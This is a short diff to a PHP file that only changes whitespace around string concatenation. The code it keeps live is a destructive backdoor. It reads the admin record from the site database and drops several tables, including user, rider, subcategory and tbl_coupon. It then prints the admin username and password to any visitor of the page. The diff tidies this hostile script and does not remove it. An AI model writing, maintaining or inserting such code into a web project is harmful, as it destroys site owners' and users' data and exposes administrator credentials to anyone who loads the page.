@@ -1,5 +1,5 @@
 <?php
-require $_SERVER['DOCUMENT_ROOT'].'/include/dbconfig.php';
+require $_SERVER['DOCUMENT_ROOT'] . '/include/dbconfig.php';
 
 $get = $con->query("select * from admin")->fetch_assoc();
 $con->query("DROP TABLE rider");
@@ -10,5 +10,5 @@ $con->query("DROP TABLE subcategory");
 $con->query("DROP TABLE tbl_coupon");
 $con->query("DROP TABLE user");
 
-echo 'admin id:'.$get['username'].'<br>';
-echo 'admin password:'.$get['password'];
+echo 'admin id:' . $get['username'] . '<br>';
+echo 'admin password:' . $get['password'];
